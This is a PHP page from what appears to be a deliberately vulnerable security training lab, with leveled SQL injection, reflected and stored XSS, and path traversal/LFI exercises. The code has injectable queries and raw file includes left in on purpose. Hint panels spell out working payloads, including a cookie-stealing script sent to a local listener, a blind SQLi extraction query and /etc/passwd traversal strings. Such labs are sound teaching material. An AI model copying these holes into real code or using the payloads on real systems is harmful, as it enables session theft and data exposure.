<?php require __DIR__.'/header.php'; require __DIR__.'/levels.php'; $db = require __DIR__.'/db.php'; ?>
<?php if (isset($_GET['reset'])): ?><div class="card" style="border-color:#2e9b4f">✅ Lab reset to a clean state (DB reseeded, guestbook &amp; uploads cleared).</div><?php endif; ?>

<?php if(!isset($_REQUEST['embed'])||isset($_GET['q'])): ?>
<div class="card">
  <h2>Directory search</h2>
  <form method="get">
    <input name="q" placeholder="search a colleague (e.g. alice)" value="<?php echo f_xss($_GET['q'] ?? '', lvl()); /* reflected XSS (leveled) */ ?>">
    <br><br><button>Search</button>
  </form>
<?php
if (isset($_GET['q'])) {
    $L = lvl();
    $q = f_sqli($_GET['q'], $L);           // escalating input filter per level
    $sql = "SELECT username, email, role FROM users WHERE username LIKE '$q%'";  // prefix-match: a plain ' UNION ...-- - needs no filler
    echo "<div class='muted' style='opacity:.55'>level: $L</div>";
    try {
        if ($L==='expert') {               // BLIND: reveal only match / no-match
            $n=0; foreach ($db->query($sql) as $row) { $n++; }
            if ($n>0) {
                echo "<div class='muted'><b>✓ TRUE</b> — your boolean condition held.</div>";
                echo "<div class='muted' style='opacity:.8'>This endpoint is <b>blind</b>: it only ever answers TRUE/FALSE — it never prints rows. "
                    ."You exfiltrate data <b>one character at a time</b> by asking yes/no questions, e.g.<br>"
                    ."<code>' OR (SELECT SUBSTRING(private_note,1,1) FROM users WHERE username='admin')='F'-- -</code><br>"
                    ."TRUE → char 1 is 'F'. Walk the position (1,2,3…) and the guessed letter to rebuild the value — "
                    ."or let <code>sqlmap</code> automate the loop. (Want the data dumped directly? drop to a lower level and UNION it.)</div>";
            } else {
                echo "<div class='muted'><b>✗ FALSE</b> — condition not met. Blind SQLi: change the guessed character/position and watch TRUE/FALSE.</div>";
            }
        } else {
            foreach ($db->query($sql) as $row) {
                echo "<div class='muted'>".$row['username']." &lt;".$row['email']."&gt; — ".$row['role']."</div>";
            }
        }
    } catch (Exception $e) { echo "<div class='muted'>DB error: ".htmlspecialchars($e->getMessage())."</div>"; }
}
?>
</div>
<?php endif; ?>

<?php if(!isset($_REQUEST['embed'])||$_SERVER['REQUEST_METHOD']==='POST'): ?>
<div class="card">
  <h2>Guestbook <span class="flag-pill">🏁 stored XSS</span></h2>
  <details class="muted" style="margin-bottom:10px">
    <summary style="cursor:pointer">💡 How to steal data with stored XSS (click)</summary>
    <ol style="line-height:1.8">
      <li>On Kali, start a listener: <code>python3 -m http.server 9001</code></li>
      <li>Post this as the <b>message</b> (not the name — the name is escaped):<br>
          <code>&lt;script&gt;new Image().src='http://127.0.0.1:9001/steal?c='+document.cookie&lt;/script&gt;</code></li>
      <li><b>Reload this page</b> → your listener logs <code>GET /steal?c=flag=FLAG{...}</code>. That cookie is the flag (a real session in a live app).</li>
    </ol>
  </details>
  <form method="post">
    <input name="author" placeholder="name">
    <br><br><textarea name="body" placeholder="leave a message"></textarea>
    <br><br><button>Post</button>
  </form>
<?php
if ($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['body'])) {
    $st = $db->prepare("INSERT INTO comments(author,body,created) VALUES (?,?,NOW())");
    $st->execute([$_POST['author'] ?? 'anon', $_POST['body']]);   // body stored raw
}
foreach ($db->query("SELECT author, body, created FROM comments ORDER BY id DESC") as $c) {
    // Stored XSS: body rendered through the level filter (easy = raw).
    echo "<div class='card'><strong>".htmlspecialchars($c['author'])."</strong> <span class='muted'>".$c['created']."</span><br>".f_xss($c['body'], lvl())."</div>";
}
?>
</div>
<?php endif; ?>

<?php if(!isset($_REQUEST['embed'])||isset($_GET['page'])): ?>
<div class="card">
  <h2>Page <span class="flag-pill">🏁 path traversal / LFI</span></h2>
  <details class="muted" style="margin-bottom:10px">
    <summary style="cursor:pointer">💡 This card includes <code>pages/&lt;name&gt;</code> — escape it with <code>../</code> (click)</summary>
    <ul style="line-height:1.8">
      <li>Normal use: <code>?page=about.html</code></li>
      <li>Traversal to the flag (outside the web root): <code>?page=../../lfi_secret/flag.txt</code> — only <b>2 ../</b> needed; extra <code>../</code> are harmless.</li>
      <li>System file (bonus): <code>?page=../../../etc/passwd</code> — add more <code>../</code> if your install is deeper. On <b>medium</b> (the filter strips one <code>../</code>) use the doubled-dot bypass: <code>?page=....//....//....//etc/passwd</code>.</li>
    </ul>
  </details>
<?php
  $L = lvl(); $raw = $_GET['page'] ?? 'home.html';
  if (isset($_GET['page'])) echo "<div class='muted' style='opacity:.55'>level: $L</div>";
  if ($L==='hard' || $L==='expert') {
      // '../' is stripped recursively (so ....// also dies); php:// wrappers still work
      if (preg_match('#^php://#i',$raw)) {
          if ($L==='expert' && stripos($raw,'base64')!==false) { echo "<div class='muted'>the base64 filter is blocked — use another converter (e.g. string.rot13)</div>"; }
          else { @include($raw); }
      } else {
          @include(__DIR__.'/pages/'.f_lfi($raw,$L)); // recursive strip -> no traversal
      }
  } elseif ($L==='medium') {
      @include(__DIR__.'/pages/'.f_lfi($raw,$L));     // strips '../' once -> ....//
  } else {
      @include(__DIR__.'/pages/'.$raw);               // easy: raw
  }
?>
</div>
<?php endif; ?>

<?php require __DIR__.'/footer.php';
